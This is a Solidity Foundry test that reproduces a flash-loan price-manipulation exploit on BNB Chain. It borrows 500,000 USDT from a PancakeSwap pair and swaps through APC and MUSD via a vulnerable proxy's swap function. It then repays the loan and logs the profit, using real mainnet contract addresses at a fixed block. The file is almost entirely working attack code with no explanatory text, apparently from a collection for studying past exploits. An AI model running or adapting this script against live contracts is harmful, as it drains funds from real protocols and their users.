// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import "./interface.sol";
import "forge-std/console.sol";

interface IPancakeCallee {
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract ContractsTest is Test {

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IPancakePair Pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IERC20 APC = IERC20(0x2AA504586d6CaB3C59Fa629f74c586d78b93A025);
    IERC20 MUSD = IERC20(0x473C33C55bE10bB53D81fe45173fcc444143a13e);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouter Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    address TransparentUpgradeableProxy = 0x5a88114F02bfFb04a9A13a776f592547B3080237;

    function setUp() public {
        cheats.createSelectFork("ankr_bsc", 23527906);
        cheats.deal(msg.sender, 100 ether);
    }

    function testExploit() public payable {
      uint256 _reserve0 = 500_000 * 1e18;
      Pair.swap(_reserve0, 0, address(this), new bytes(1));
    }
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        sender;
        amount0;
        amount1;
        data;
        data;
        uint256 wad0 = USDT.balanceOf(address(this));
        USDT.approve(address(Router), 10_000_000*1e18);

        address lp = 0x3DE032D5D11c94d2d79dBa0c34D7851FFAA05DD8;
        uint256 balance1 = APC.balanceOf(lp);
        address[] memory path0 = new address[](2);
        path0[0] = address(USDT);
        path0[1] = address(APC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(500_000*1e18, 1, path0, address(this), block.timestamp);
        APC.approve(TransparentUpgradeableProxy, 1_000_000_000*1e18);

        bool result;
        uint256 wad1 = 100_000 * 1e18; 
        (result, ) = TransparentUpgradeableProxy.call(
          abi.encodePacked(bytes4(keccak256("swap(address,address,uint256)")),abi.encode(address(APC)),abi.encode(address(MUSD)),wad1)
        );

        MUSD.approve(TransparentUpgradeableProxy, 1_000_000*1e18);
        APC.approve(address(Router), 100_000_000*1e18);

        uint256 wad2 = APC.balanceOf(address(this));
        address[] memory path1 = new address[](2);
        path1[0] = address(APC);
        path1[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(wad2, 1, path1, address(this), block.timestamp);

        uint256 wad3 = MUSD.balanceOf(address(this));
        
        (result, ) = TransparentUpgradeableProxy.call(
          abi.encodePacked(bytes4(keccak256("swap(address,address,uint256)")),abi.encode(address(MUSD)),abi.encode(address(APC)),wad3)
        );
        
        uint256 wad5 = APC.balanceOf(address(this));
        address[] memory path2 = new address[](2);
        path2[0] = address(APC);
        path2[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(wad5, 1, path2, address(this), block.timestamp);
        // USDT.transfer(address(Pair), 501500*1e18);
        USDT.transfer(address(Pair), 501254*1e18);

        uint256 wad6 = USDT.balanceOf(address(this));
        console.log(wad6/1e18,'ether');
    }
    receive() external payable { }
}
